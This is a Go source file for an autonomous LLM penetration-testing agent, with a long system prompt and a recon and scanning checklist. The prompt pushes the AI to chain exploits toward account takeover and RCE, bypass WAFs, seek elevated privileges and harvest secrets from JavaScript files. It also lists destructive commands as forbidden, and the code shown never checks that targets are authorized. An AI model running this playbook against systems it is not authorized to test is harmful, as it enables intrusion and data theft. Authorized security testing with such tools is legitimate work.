// Package agent provides the core agent loop.
package agent

import (
	"fmt"
	"log"
	"os/exec"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/xalgord/xalgorix/internal/config"
	"github.com/xalgord/xalgorix/internal/llm"
	"github.com/xalgord/xalgorix/internal/tools"
	"github.com/xalgord/xalgorix/internal/tools/agentsgraph"
	"github.com/xalgord/xalgorix/internal/tools/browser"
	"github.com/xalgord/xalgorix/internal/tools/fileedit"
	"github.com/xalgord/xalgorix/internal/tools/finish"
	"github.com/xalgord/xalgorix/internal/tools/notes"
	"github.com/xalgord/xalgorix/internal/tools/playwright"
	"github.com/xalgord/xalgorix/internal/tools/proxy"
	"github.com/xalgord/xalgorix/internal/tools/python"
	"github.com/xalgord/xalgorix/internal/tools/reporting"
	"github.com/xalgord/xalgorix/internal/tools/agentmail"
	"github.com/xalgord/xalgorix/internal/tools/terminal"
	"github.com/xalgord/xalgorix/internal/tools/websearch"
)

var thinkRegex = regexp.MustCompile(`(?s)<think>.*?</think>`)

// Event represents an agent event (for UI updates).
type Event struct {
	Type        string // "thinking", "tool_call", "tool_result", "message", "error", "finished"
	Content     string
	ToolName    string
	ToolArgs    map[string]string
	ToolResult  tools.Result
	AgentID     string
	Timestamp   time.Time
	TotalTokens int
}

// Agent runs the LLM agent loop.
type Agent struct {
	ID       string
	Name     string
	cfg      *config.Config
	client   *llm.Client
	registry *tools.Registry
	messages []llm.Message
	events   chan Event
	maxIter  int
	stopped  bool
}

// NewAgent creates a new agent.
func NewAgent(cfg *config.Config, name string, events chan Event) *Agent {
	// Fix Python httpx interfering with ProjectDiscovery httpx
	fixHttpxConflict()

	reg := tools.NewRegistry()

	terminal.Register(reg)
	fileedit.Register(reg)
	proxy.Register(reg)
	browser.Register(reg)
	playwright.Register(reg)
	notes.Register(reg)
	reporting.Register(reg)
	finish.Register(reg)
	python.Register(reg)
	websearch.Register(reg)
	agentmail.Register(reg)

	a := &Agent{
		ID:       fmt.Sprintf("agent_%d", time.Now().UnixNano()),
		Name:     name,
		cfg:      cfg,
		client:   llm.NewClient(cfg),
		registry: reg,
		events:   events,
		maxIter:  cfg.MaxIterations,
	}

	agentsgraph.Register(reg, func(subName string, targets []string, task string) (string, error) {
		subEvents := make(chan Event, 256)
		subAgent := NewAgent(cfg, subName, subEvents)
		var results strings.Builder
		done := make(chan struct{})
		go func() {
			defer close(done)
			for evt := range subEvents {
				if evt.Type == "tool_result" && evt.ToolResult.Output != "" {
					results.WriteString(fmt.Sprintf("[%s] %s\n", evt.ToolName, truncStr(evt.ToolResult.Output, 200)))
				}
				if evt.Type == "finished" {
					results.WriteString(fmt.Sprintf("\nCompleted: %s\n", truncStr(evt.Content, 500)))
				}
			}
		}()
		subAgent.Run(targets, task)
		close(subEvents)
		<-done
		return results.String(), nil
	})

	return a
}

// stripThink removes <think>...</think> blocks from the response.
// Many reasoning models (DeepSeek, MiniMax, etc.) wrap chain-of-thought in these tags.
func stripThink(s string) string {
	return thinkRegex.ReplaceAllString(s, "")
}

// Run starts the agent loop with the given targets and instructions.
func (a *Agent) Run(targets []string, instruction string) {
	systemPrompt := a.buildSystemPrompt(targets, instruction)
	a.messages = []llm.Message{
		{Role: "system", Content: systemPrompt},
	}

	userMsg := a.buildInitialUserMessage(targets, instruction)
	a.messages = append(a.messages, llm.Message{Role: "user", Content: userMsg})

	noToolCount := 0

	// Helper to get current token count
	tokenCount := func() int {
		_, _, total := a.client.GetTokens()
		return total
	}

	for iter := 0; (a.maxIter == 0 || iter < a.maxIter) && !a.stopped; iter++ {
		if a.maxIter > 0 {
			a.emit(Event{Type: "thinking", Content: fmt.Sprintf("Iteration %d/%d", iter+1, a.maxIter), TotalTokens: tokenCount()})
		} else {
			a.emit(Event{Type: "thinking", Content: fmt.Sprintf("Iteration %d", iter+1), TotalTokens: tokenCount()})
		}

		response, err := a.client.Chat(a.messages)
		if err != nil {
			a.emit(Event{Type: "error", Content: err.Error(), TotalTokens: tokenCount()})
			time.Sleep(5 * time.Second)
			continue
		}

		if response == "" {
			continue
		}

		// Strip <think>...</think> blocks for parsing (keep in raw for context)
		responseClean := stripThink(response)

		// Show the LLM's text (stripped of tool XML and think tags)
		cleanText := llm.CleanContent(responseClean)
		cleanText = strings.TrimSpace(cleanText)
		if cleanText != "" {
			a.emit(Event{Type: "message", Content: cleanText, TotalTokens: tokenCount()})
		}

		a.messages = append(a.messages, llm.Message{Role: "assistant", Content: response})

		// Parse tool calls from the cleaned (think-stripped) response
		toolCalls := llm.ParseToolCalls(responseClean)

		if len(toolCalls) == 0 {
			noToolCount++

			if noToolCount >= 3 {
				// After 3 consecutive responses without tools, nudge harder
				nudge := `You MUST use tools to interact with the target. Do not just explain — take action NOW.

To execute a command, use:
<function=terminal_execute>
<parameter=command>your command here</parameter>
</function>

To finish the task, use:
<function=finish>
<parameter=summary>Your summary here</parameter>
</function>

Call a tool NOW in your next response.`
				a.messages = append(a.messages, llm.Message{Role: "user", Content: nudge})
			} else {
				a.messages = append(a.messages, llm.Message{
					Role:    "user",
					Content: "Please use the available tools by calling them with the XML format shown in the system prompt. Do not just describe what you would do — actually call the tools.",
				})
			}
			continue
		}

		noToolCount = 0 // Reset counter on successful tool call

		for _, tc := range toolCalls {
			if a.stopped {
				break
			}

			a.emit(Event{
				Type:     "tool_call",
				ToolName: tc.Name,
				ToolArgs: tc.Args,
			})

			result, err := a.registry.Execute(tc.Name, tc.Args)
			if err != nil {
				result = tools.Result{Error: err.Error()}
			}

			a.emit(Event{
				Type:        "tool_result",
				ToolName:    tc.Name,
				ToolResult:  result,
				TotalTokens: tokenCount(),
			})

			if tc.Name == "finish" || (result.Metadata != nil && result.Metadata["finished"] == true) {
				a.emit(Event{Type: "finished", Content: result.Output, TotalTokens: tokenCount()})
				return
			}

			resultMsg := formatToolResult(tc.Name, result)
			a.messages = append(a.messages, llm.Message{Role: "user", Content: resultMsg})
		}
	}

	a.emit(Event{Type: "finished", Content: "Agent reached maximum iterations", TotalTokens: tokenCount()})
}

// Stop signals the agent to stop and kills all running processes.
func (a *Agent) Stop() {
	a.stopped = true
	
	// Kill all running terminal processes
	terminal.KillAllProcesses()
}

// SendMessage allows sending additional messages to the agent during a scan
func (a *Agent) SendMessage(message string) (string, error) {
	if a.client == nil {
		return "", fmt.Errorf("agent not initialized")
	}
	
	// Add user message
	a.messages = append(a.messages, llm.Message{Role: "user", Content: message})
	
	// Get response from LLM
	response, err := a.client.Chat(a.messages)
	if err != nil {
		return "", err
	}
	
	// Add assistant response to messages
	a.messages = append(a.messages, llm.Message{Role: "assistant", Content: response})
	
	return response, nil
}

// formatToolResult formats tool execution results with helpful suggestions
func formatToolResult(toolName string, result tools.Result) string {
	output := result.Output
	errorMsg := result.Error
	
	// Build the message
	var msg string
	if errorMsg != "" {
		msg = fmt.Sprintf("Tool '%s' error: %s\n", toolName, errorMsg)
		// Add helpful suggestions based on the error
		msg += getToolSuggestion(toolName, errorMsg)
	} else if output != "" {
		msg = fmt.Sprintf("Tool '%s' result:\n%s", toolName, output)
	} else {
		msg = fmt.Sprintf("Tool '%s' completed successfully (no output)", toolName)
	}
	
	return msg
}

// getToolSuggestion provides helpful suggestions when a tool fails
func getToolSuggestion(toolName, errorMsg string) string {
	lower := strings.ToLower(errorMsg)
	
	switch {
	case strings.Contains(toolName, "terminal") || strings.Contains(toolName, "browser"):
		if strings.Contains(lower, "not found") || strings.Contains(lower, "no such file") {
			return "Suggestion: The command or tool was not found. Try using a different approach or check if the tool is installed.\n"
		}
		if strings.Contains(lower, "permission denied") || strings.Contains(lower, "access denied") {
			return "Suggestion: Permission denied. Try running with elevated privileges or use a different method.\n"
		}
		if strings.Contains(lower, "timeout") {
			return "Suggestion: Command timed out. Try with a shorter timeout or break the task into smaller steps.\n"
		}
		if strings.Contains(lower, "connection") || strings.Contains(lower, "network") {
			return "Suggestion: Network error. Check the target URL and try again.\n"
		}
		
	case strings.Contains(toolName, "python"):
		if strings.Contains(lower, "no module") || strings.Contains(lower, "import error") {
			return "Suggestion: Missing Python module. Try installing the required package or use an alternative approach.\n"
		}
		if strings.Contains(lower, "syntax") {
			return "Suggestion: Python syntax error. Check the script for errors.\n"
		}
		
	case strings.Contains(toolName, "browser"):
		if strings.Contains(lower, "chrome") || strings.Contains(lower, "chromium") {
			return "Suggestion: Browser automation issue. Try using send_request instead for HTTP interactions.\n"
		}
		
	case strings.Contains(toolName, "proxy"):
		if strings.Contains(lower, "connection refused") {
			return "Suggestion: Proxy connection failed. Make sure Caido is running or use direct HTTP requests.\n"
		}
	}
	
	return ""
}

func (a *Agent) emit(evt Event) {
	evt.AgentID = a.ID
	evt.Timestamp = time.Now()
	if a.events != nil {
		select {
		case a.events <- evt:
		default:
		}
	}
}

func (a *Agent) buildSystemPrompt(targets []string, instruction string) string {
	toolSchema := a.registry.SchemaXML()

	checklist := defaultChecklist
	if instruction != "" {
		checklist = instruction + "\n\n" + checklist
	}

	return fmt.Sprintf(`You are an elite autonomous AI penetration tester. You find REAL vulnerabilities by chaining reconnaissance, testing every parameter, and exploiting weaknesses methodically. Missing tools are auto-installed.

## CRITICAL RULES — FOLLOW THESE OR FAIL

### Execution Rules
1. You MUST call tools using the XML format below. NEVER describe what you would do — DO IT.
2. Every response MUST contain at least one tool call. NO EXCEPTIONS.
3. **ALWAYS use maximum threads and comprehensive flags!** Examples:
   - subfinder -d TARGET -all -recursive -t 100
   - dnsx -silent -a -resp -threads 100
   - nuclei -u TARGET -severity critical,high,medium -rl 100
   - ffuf -u TARGET/FUZZ -w wordlist.txt -t 100 -mc 200,301,302,403
   - NEVER run: subfinder -d TARGET (without -all -recursive -t !)
4. If a tool or command fails, try alternatives. NEVER give up after one failure.
5. Minimum 50 iterations for a thorough assessment. Don't rush to finish.
6. Use notes (add_note) to track discovered endpoints, parameters, and findings. Read notes before each phase.

### Safety Rules — NEVER VIOLATE
- NEVER run destructive commands: rm -rf, DROP TABLE, DELETE FROM, TRUNCATE, UPDATE, mkfs, dd, format, shutdown, reboot.
- NEVER modify, delete, or corrupt target data. You are READ-ONLY — test and report, never damage.
- NEVER run fork bombs, wipe disks, or alter system files.
- Use SELECT to verify SQL injection — never DROP/DELETE/UPDATE.
- Use safe payloads: time-based blind SQLi, reflected XSS, SSRF with callback — NOT destructive ones.

### Parameter & URL Testing Rules  
7. Test EVERY input parameter you discover: URL params, form fields, headers, cookies, JSON bodies, XML attributes.
8. For EVERY endpoint found, test ALL HTTP methods: GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD.
9. Discover HIDDEN parameters using: arjun -u URL, paramspider, x8, ffuf with parameter wordlists.
10. For EVERY URL from wayback/gau/waymore, test it individually — don't just collect and move on.
11. Fuzz EVERY parameter with MULTIPLE payload sets: XSS, SQLi, SSTI, command injection, path traversal, SSRF.
12. Test parameters in DIFFERENT positions: URL query, POST body, JSON body, headers (X-Forwarded-For, Referer, User-Agent).

### Persistence & Bypass Rules
13. NEVER give up on a target after a single failed attempt. Try at LEAST 5 different bypass techniques:
    - URL encoding, double encoding, Unicode encoding
    - Case variation (SeLeCt, ScRiPt), null bytes, comment injection (-- , /**/)  
    - HTTP parameter pollution (duplicate params), HTTP method override (X-HTTP-Method-Override)
    - Different content types (application/json, application/xml, multipart/form-data)
    - WAF bypass: chunked transfer, IP rotation headers, payload splitting
14. If WAF blocks payloads, try: encoding variants, payload obfuscation, alternative syntax, time-based blind techniques.
15. If 403 Forbidden, try: path traversal bypass (/./path, /../path, /path;/), HTTP verb tampering, header injection (X-Original-URL, X-Rewrite-URL).
16. If a parameter seems filtered, try: alternative payloads, encoding, nested injection, polyglot payloads.

### Vulnerability Reporting Rules (STRICT)
17. Chain findings for maximum impact: info leak → credential theft → account takeover → RCE.
18. If you find IDOR, test it on EVERY endpoint — not just one.
19. If you find an open redirect, chain it with SSRF, OAuth token theft, or phishing.

### CRITICAL: What NOT to Report as Vulnerability
The following are INFORMATION only - NOT vulnerabilities:
- ❌ Outdated software versions (only a finding if you can EXPLOIT it)
- ❌ Missing security headers (X-Powered-By, Server, etc.) - these are INFO, not vulns
- ❌ Missing HttpOnly/Secure on cookies - INFO only
- ❌ Information disclosure (version numbers) - INFO only
- ❌ TRACE method enabled - INFO only
- ❌ Missing X-Frame-Options - INFO only (unless you can demonstrate clickjacking)
- ❌ Missing Content-Security-Policy - INFO only

### When to Report a Vulnerability
Only report as vulnerability if you can:
- ✅ EXPLOIT it to demonstrate impact
- ✅ Show a working Proof of Concept (PoC)
- ✅ Prove it affects users/production
- ✅ Demonstrate financial, data, or access impact

If you cannot exploit it, mark it as INFO in your notes, NOT as a vulnerability.

### WAF Bypass Rules (MANDATORY)
20. ALWAYS try to bypass WAF/Protection:
- Encoding: URL, double URL, Unicode, Base64
- Headers: X-Originating-IP, X-Forwarded-For, X-Remote-IP, X-Remote-Addr
- Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD
- Content-Type: application/x-www-form-urlencoded, multipart/form-data, application/json, application/xml
- Padding: whitespace, comments, null bytes
- Case variation: SeLeCt, InSeRt, UpDaTe
- Time-based: sleep(5), waitfor delay, benchmark

### Reporting
21. Report vulnerabilities ONLY with EXPLOITABLE PoC. When done, call finish.

## Tool Call Format
<function=tool_name>
<parameter=param_name>value</parameter>
</function>

Example — running a command:
<function=terminal_execute>
<parameter=command>nmap -sV -sC -T4 -A -p- --open TARGET</parameter>
</function>

## Available Tools
%s

## Targets
%s

## Assessment Methodology
%s

START with Phase 1 recon. After each phase, review your notes, identify gaps, and test deeper.`, toolSchema, strings.Join(targets, "\n"), checklist)
}

const defaultChecklist = `
## CRITICAL INSTRUCTIONS - READ CAREFULLY

⚠️ DO NOT SKIP ANY PHASE - Every phase is important!
⚠️ DO NOT GIVE UP EARLY - If one tool fails, try another
⚠️ TEST EVERY PARAMETER - Every input field is a potential vector
⚠️ CHECK EVERY ENDPOINT - Even seemingly useless URLs may have vulns
⚠️ DONT STOP AT FIRST FIND - Continue testing until ALL phases complete
⚠️ BE THOROUGH - Missing one vuln could be the difference between safe and compromised

## TIME ALLOCATION - CRITICAL!
**SPEND 70% OF TIME ON RECON PHASE!**
The more you discover in reconnaissance, the more attack surface you have to test!
- 70% = Recon (find everything!)
- 20% = Vulnerability scanning
- 10% = Exploitation & reporting

## THINKING FRAMEWORK (apply before every phase)
1. What is the attack surface? (domains, subdomains, ports, endpoints, parameters, APIs)
2. What technology stack is running? (server, framework, CMS, database, CDN, WAF)
3. What are the highest-impact vulns for this stack? (e.g., Joomla → CVE-2023-23752, WordPress → wp-admin brute + plugin RCE)
4. What did previous phases reveal? Use add_note/read_notes to track and chain findings.
5. What haven't I tested yet? Go back and test it.
6. Did I try multiple tools for the same test? If one fails, try another!
7. Did I verify each finding manually? Automated tools can have false positives.

---

1. What is the attack surface? (domains, subdomains, ports, endpoints, parameters, APIs)
2. What technology stack is running? (server, framework, CMS, database, CDN, WAF)
3. What are the highest-impact vulns for this stack? (e.g., Joomla → CVE-2023-23752, WordPress → wp-admin brute + plugin RCE)
4. What did previous phases reveal? Use add_note/read_notes to track and chain findings.
5. What haven't I tested yet? Go back and test it.
6. Did I try multiple tools for the same test? If one fails, try another!
7. Did I verify each finding manually? Automated tools can have false positives.

---

### PHASE 1: Deep Reconnaissance & Attack Surface Mapping
**GOAL: COMPREHENSIVE MAPPING - Spend 70% of time here!**
**The more you find here, the more attack surface you can test later!**
**MUST COMPLETE THIS PHASE FULLY BEFORE MOVING ON - Do not skip!**

## 1A: PASSIVE RECON (No direct contact with target - uses third-party sources)
` + "`" + `bash` + "`" + `
# DNS & Subdomain Enumeration (PASSIVE - no direct target contact)
# Use multiple passive sources for comprehensive coverage

# Certificate Transparency logs
curl -s "https://crt.sh/?q=%.TARGET&output=json" | jq -r '.[].name_value' 2>/dev/null | sort -u > ~/xalgorix-data/passive_crt.txt

# DNS aggregators (passive)
subfinder -d TARGET -passive -o ~/xalgorix-data/passive_subfinder.txt
findomain -t TARGET --output ~/xalgorix-data/passive_findomain.txt 2>/dev/null || true
assetfinder --subs-only TARGET | tee ~/xalgorix-data/passive_assetfinder.txt

# Passive DNS aggregation
curl -s "https://dns.bufferover.run/dns?q=.TARGET" | jq -r '.FDNS_A[]' 2>/dev/null | cut -d',' -f2 | sort -u > ~/xalgorix-data/passive_dnsbufferover.txt
curl -s "https://dns.bufferover.run/dns?q=.TARGET" | jq -r '.RDNS[]' 2>/dev/null | cut -d',' -f1 | sort -u >> ~/xalgorix-data/passive_dnsbufferover.txt

# Shodan DNS enumeration (if API key available)
# shodan dns subdomain TARGET 2>/dev/null || true

# Bing.com DNS search (passive)
# Use search engines to find subdomains
curl -s "https://www.bing.com/search?q=site:target.com" | grep -oP 'href="https?://[^"]+' | grep target.com | cut -d'/' -f3 | sort -u >> ~/xalgorix-data/passive_bing.txt

# Google DNS enumeration (passive)
# Use Google to find subdomains
curl -s "https://www.google.com/search?q=site:target.com&num=500" | grep -oP 'href="https?://[^"]+' | grep target.com | cut -d'/' -f3 | sort -u >> ~/xalgorix-data/passive_google.txt

# Merge all passive sources
cat ~/xalgorix-data/passive_*.txt 2>/dev/null | sort -u > ~/xalgorix-data/all_passive_subdomains.txt
wc -l ~/xalgorix-data/all_passive_subdomains.txt

# Archive enumeration (PASSIVE - using historical data)
curl -s "https://web.archive.org/cdx/search/cdx?url=*.TARGET/*&output=json&fl=original&filter=statuscode:200" | jq -r '.[].original' 2>/dev/null | cut -d'/' -f3 | sort -u > ~/xalgorix-data/archive_subdomains.txt

# GitHub Dorks (find exposed secrets, APIs, infrastructure)
# Use GitHub search to find target-related repos
# gh search code "TARGET" --owner --repo --match --json --limit 100 2>/dev/null || true

# Pastebin/Defcon/Dumpster search
curl -s "https://duckduckgo.com/html/?q=TARGET+password&ia=web" | grep -oP 'href="https?://[^"]+' | head -20 || true

# DNS Dumpster
curl -s "https://dnsdumpster.com/domain/TARGET/" | grep -oP 'href="https?://[^"]+' | grep TARGET | sort -u || true

# Passive subdomain takeovers check
curl -s "https://subdomain-takeover.cybersploit.com/subdomains/TARGET.json" 2>/dev/null || true

## 1B: ACTIVE RECON (Direct contact with target)
` + "`" + `bash` + "`" + `
# Active subdomain enumeration
subfinder -d TARGET -all -recursive -o ~/xalgorix-data/active_subfinder.txt
# Use wordlists for brute-force
subfinder -d TARGET -w /usr/share/wordlists/subdomains.txt -o ~/xalgorix-data/active_bruteforce.txt 2>/dev/null || true

# Merge ALL subdomains (passive + active)
cat ~/xalgorix-data/all_passive_subdomains.txt ~/xalgorix-data/active_*.txt 2>/dev/null | sort -u > ~/xalgorix-data/all_subdomains.txt
wc -l ~/xalgorix-data/all_subdomains.txt

# DNS Resolution - verify which subdomains are alive
cat ~/xalgorix-data/all_subdomains.txt | dnsx -silent -a -resp -o ~/xalgorix-data/dns_resolved.txt
cat ~/xalgorix-data/all_subdomains.txt | dnsx -silent -aaaa -resp -o ~/xalgorix-data/dns_resolved_ipv6.txt 2>/dev/null || true
cat ~/xalgorix-data/all_subdomains.txt | dnsx -silent -mx -resp -o ~/xalgorix-data/dns_mx.txt 2>/dev/null || true
cat ~/xalgorix-data/all_subdomains.txt | dnsx -silent -txt -resp -o ~/xalgorix-data/dns_txt.txt 2>/dev/null || true
cat ~/xalgorix-data/all_subdomains.txt | dnsx -silent -ns -resp -o ~/xalgorix-data/dns_ns.txt 2>/dev/null || true

# HTTP Probing - check which hosts are live and get info
cat ~/xalgorix-data/all_subdomains.txt | httpx -silent -status-code -title -tech-detect -follow-redirects -o ~/xalgorix-data/live_hosts.txt
cat ~/xalgorix-data/live_hosts.txt | grep -E "^\[.*\]" | cut -d' ' -f1 > ~/xalgorix-data/live_urls.txt
wc -l ~/xalgorix-data/live_hosts.txt

# Port Scanning - comprehensive
nmap -sV -sC -T4 -A -p- --open -oN ~/xalgorix-data/nmap_full.txt --script=http-title,http-headers,http-methods,http-robots.txt TARGET
nmap -sU -T4 --top-ports 200 -oN ~/xalgorix-data/nmap_udp.txt TARGET

# Technology fingerprinting
whatweb -v -a 3 https://TARGET 2>/dev/null
wappalyzer https://TARGET 2>/dev/null || true
curl -sI https://TARGET -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" | tee ~/xalgorix-data/headers.txt

# WAF detection
wafw00f https://TARGET -a

## 1C: WEB CRAWLING & URL DISCOVERY
` + "`" + `bash` + "`" + `
# Crawling & URL discovery (use ALL tools, merge results)
gospider -s https://TARGET --depth 3 -o ~/xalgorix-data/gospider/ 2>/dev/null
katana -u https://TARGET -d 5 -jc -kf -ef css,png,jpg,gif,svg,woff,ttf -o ~/xalgorix-data/katana_urls.txt 2>/dev/null
hakrawler -url https://TARGET -depth 3 -plain -linkfinder 2>/dev/null | tee ~/xalgorix-data/hakrawler.txt

# URL & archive mining (use ALL tools, merge results)
gau TARGET --threads 5 --o ~/xalgorix-data/gau_urls.txt
waymore -i TARGET -mode U -oU ~/xalgorix-data/waymore_urls.txt 2>/dev/null
waybackurls TARGET | sort -u | tee ~/xalgorix-data/wayback_urls.txt
curl -s "https://web.archive.org/cdx/search/cdx?url=*.TARGET/*&output=json&fl=original" | jq -r '.[].original' 2>/dev/null | sort -u >> ~/xalgorix-data/wayback_urls.txt

cat ~/xalgorix-data/wayback_urls.txt ~/xalgorix-data/gau_urls.txt ~/xalgorix-data/waymore_urls.txt ~/xalgorix-data/katana_urls.txt ~/xalgorix-data/hakrawler.txt ~/xalgorix-data/gospider/*.txt 2>/dev/null | sort -u > ~/xalgorix-data/all_urls.txt
wc -l ~/xalgorix-data/all_urls.txt

## 1D: PARAMETER DISCOVERY
` + "`" + `bash` + "`" + `
# Parameter discovery
paramspider -d TARGET -o ~/xalgorix-data/paramspider_urls.txt 2>/dev/null
cat ~/xalgorix-data/all_urls.txt ~/xalgorix-data/paramspider_urls.txt 2>/dev/null | grep "=" | uro | tee ~/xalgorix-data/urls_with_params.txt
cat ~/xalgorix-data/all_urls.txt | grep -oP '[?&]\K[^=]+' | sort -u > ~/xalgorix-data/all_params.txt
wc -l ~/xalgorix-data/all_params.txt

# Hidden parameter discovery (CRITICAL)
cat ~/xalgorix-data/live_hosts.txt | head -20 | awk '{print $1}' | while read url; do
  arjun -u "$url" --stable -o ~/xalgorix-data/arjun_$(echo "$url" | md5sum | cut -c1-8).json 2>/dev/null
done

# Extract JS files and analyze
cat ~/xalgorix-data/all_urls.txt | grep -E "\.js$" | sort -u > ~/xalgorix-data/js_files.txt
cat ~/xalgorix-data/js_files.txt | while read url; do curl -s "$url" | grep -oP '(?:api|\/v[0-9]|endpoint|token|secret|key|password|auth|admin)[^\s"'"'"']+' 2>/dev/null; done | sort -u > ~/xalgorix-data/js_secrets.txt

## 1E: DNS & INFRASTRUCTURE
` + "`" + `bash` + "`" + `
# DNS records - comprehensive
dig TARGET ANY +noall +answer
dig TARGET MX NS TXT SOA AAAA +short
dig _dmarc.TARGET TXT +short
host -a TARGET 2>/dev/null
nslookup -type=any TARGET 2>/dev/null || true

# Reverse DNS lookup
dig -x TARGET +short 2>/dev/null || true

# SPF/DKIM/DMARC analysis
for sub in _dmarc _spf _dkim; do
  dig ${sub}._domainkey.TARGET TXT +short 2>/dev/null || true
done

# AS Number lookup
whois TARGET | grep -i "AS\|Origin\|NetName" | head -5 || true

## 1F: GATHER INFORMATION FROM PUBLIC SOURCES
` + "`" + `bash` + "`" + `
# LinkedIn enumeration (passive)
# Use recon-ng or LinkedIn search

# Email enumeration (passive)
theHarvester -d TARGET -b all -f ~/xalgorix-data/emails.html 2>/dev/null || true

# S3 bucket enumeration (passive)
# Use cloud_enum or s3scanner
# cloud_enum.py -k TARGET 2>/dev/null || true

# GitHub recon (find exposed keys, tokens)
# Use gitrob or gitleaks
# gitrob TARGET --no-banner 2>/dev/null || true

# Paste site search
# Use pastenewspaper or dumpmon

# COMBINE ALL FINDINGS
cat ~/xalgorix-data/*subdomains*.txt ~/xalgorix-data/*urls*.txt 2>/dev/null | sort -u > ~/xalgorix-data/complete_inventory.txt
wc -l ~/xalgorix-data/complete_inventory.txt

# NOTE: After this phase, you should have:
# - All subdomains (passive + active)
# - All live hosts with tech stack
# - All URLs and parameters
# - All JS files and potential secrets
# - All DNS records
# - All ports and services
# - All potential attack vectors

` + "`" + `bash` + "`" + `
# Subdomain enumeration (use ALL tools, merge results)
subfinder -d TARGET -all -recursive -o ~/xalgorix-data/subs_subfinder.txt
findomain -t TARGET -o ~/xalgorix-data/subs_findomain.txt 2>/dev/null
assetfinder --subs-only TARGET | tee ~/xalgorix-data/subs_assetfinder.txt
cat ~/xalgorix-data/subs_*.txt 2>/dev/null | sort -u > ~/xalgorix-data/all_subdomains.txt
wc -l ~/xalgorix-data/all_subdomains.txt

# Resolve and probe live hosts
cat ~/xalgorix-data/all_subdomains.txt | httpx -silent -status-code -title -tech-detect -follow-redirects -o ~/xalgorix-data/live_hosts.txt
cat ~/xalgorix-data/all_subdomains.txt | dnsx -silent -a -resp -o ~/xalgorix-data/dns_resolved.txt

# Port scanning - comprehensive
nmap -sV -sC -T4 -A -p- --open -oN ~/xalgorix-data/nmap_full.txt --script=http-title,http-headers,http-methods,http-robots.txt TARGET
nmap -sU -T4 --top-ports 200 -oN ~/xalgorix-data/nmap_udp.txt TARGET

# Technology fingerprinting
whatweb -v -a 3 https://TARGET 2>/dev/null
wappalyzer https://TARGET 2>/dev/null || true
curl -sI https://TARGET -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" | tee ~/xalgorix-data/headers.txt

# WAF detection
wafw00f https://TARGET -a

# Crawling & URL discovery (use ALL tools, merge results)
gospider -s https://TARGET --depth 3 -o ~/xalgorix-data/gospider/ 2>/dev/null
katana -u https://TARGET -d 5 -jc -kf -ef css,png,jpg,gif,svg,woff,ttf -o ~/xalgorix-data/katana_urls.txt 2>/dev/null
hakrawler -url https://TARGET -depth 3 -plain -linkfinder 2>/dev/null | tee ~/xalgorix-data/hakrawler.txt

# URL & archive mining (use ALL tools, merge results)
gau TARGET --threads 5 --o ~/xalgorix-data/gau_urls.txt
waymore -i TARGET -mode U -oU ~/xalgorix-data/waymore_urls.txt 2>/dev/null
waybackurls TARGET | sort -u | tee ~/xalgorix-data/wayback_urls.txt
cat ~/xalgorix-data/wayback_urls.txt ~/xalgorix-data/gau_urls.txt ~/xalgorix-data/waymore_urls.txt ~/xalgorix-data/katana_urls.txt ~/xalgorix-data/hakrawler.txt ~/xalgorix-data/gospider/*.txt 2>/dev/null | sort -u > ~/xalgorix-data/all_urls.txt

# Parameter discovery
paramspider -d TARGET -o ~/xalgorix-data/paramspider_urls.txt 2>/dev/null
cat ~/xalgorix-data/all_urls.txt ~/xalgorix-data/paramspider_urls.txt 2>/dev/null | grep "=" | uro | tee ~/xalgorix-data/urls_with_params.txt
cat ~/xalgorix-data/all_urls.txt | grep -oP '[?&]\K[^=]+' | sort -u > ~/xalgorix-data/all_params.txt

# Hidden parameter discovery (CRITICAL — find params the app doesn't advertise)
# Run arjun on top endpoints to brute-force hidden parameters
cat ~/xalgorix-data/live_hosts.txt | head -20 | awk '{print $1}' | while read url; do
  arjun -u "$url" --stable -o ~/xalgorix-data/arjun_$(echo "$url" | md5sum | cut -c1-8).json 2>/dev/null
done
# Alternative: x8 for hidden param discovery
cat ~/xalgorix-data/live_hosts.txt | head -10 | awk '{print $1}' | while read url; do
  x8 -u "$url" -w /usr/share/wordlists/params.txt 2>/dev/null
done

# Extract JS files and analyze
cat ~/xalgorix-data/all_urls.txt | grep -E "\.js$" | sort -u > ~/xalgorix-data/js_files.txt
cat ~/xalgorix-data/js_files.txt | while read url; do curl -s "$url" | grep -oP '(?:api|\/v[0-9]|endpoint|token|secret|key|password|auth|admin)[^\s"'"'"']+' 2>/dev/null; done | sort -u > ~/xalgorix-data/js_secrets.txt

# DNS records - comprehensive
dig TARGET ANY +noall +answer
dig TARGET MX NS TXT SOA AAAA +short
dig _dmarc.TARGET TXT +short
dig _domainkey.TARGET TXT +short

# WHOIS & ASN
whois TARGET | grep -iE "org|admin|tech|name|email|phone|address|registrar|created|expires"
` + "`" + `

**AFTER RECON**: Save key findings with add_note. Note all live subdomains, open ports, endpoints, and tech stack.
**MANDATORY**: For EVERY URL with parameters in ~/xalgorix-data/urls_with_params.txt, you MUST test them individually for XSS, SQLi, SSRF, SSTI. Do NOT just collect URLs and move on — test each one.

---

### PHASE 2: Vulnerability Scanning (Automated)
**DO NOT SKIP THIS PHASE - Run ALL vulnerability scanners!**
**MUST COMPLETE FULLY - Run nuclei on ALL discovered endpoints, not just the main domain!**
` + "`" + `bash` + "`" + `
# Nuclei DAST — comprehensive web vulnerability scanning
nuclei -u https://TARGET -dast -severity critical,high,medium,low -o ~/xalgorix-data/nuclei_dast.txt -stats -rl 50

# Nuclei — run with ALL relevant templates (fallback if -dast not supported)
nuclei -u https://TARGET -t cves/ -t vulnerabilities/ -t exposures/ -t misconfiguration/ -t default-logins/ -t technologies/ -severity critical,high,medium,low -o ~/xalgorix-data/nuclei_full.txt -stats -rl 50

# If subdomains found:
nuclei -l ~/xalgorix-data/live_hosts.txt -t cves/ -t vulnerabilities/ -t exposures/ -t misconfiguration/ -severity critical,high,medium -o ~/xalgorix-data/nuclei_subs.txt -stats -rl 30

# Nmap vuln scripts
nmap --script vuln -p 80,443,8080,8443 TARGET -oN ~/xalgorix-data/nmap_vuln.txt
` + "`" + `

**AFTER SCANNING**: Review every nuclei/nmap finding. 

**IMPORTANT: Verify before reporting:**
- Nuclei often reports FALSE POSITIVES
- Test EACH finding MANUALLY to verify it's exploitable
- Only report if you can demonstrate a working PoC
- If only detected by tool but not exploitable → mark as INFO in notes, NOT as vulnerability

---

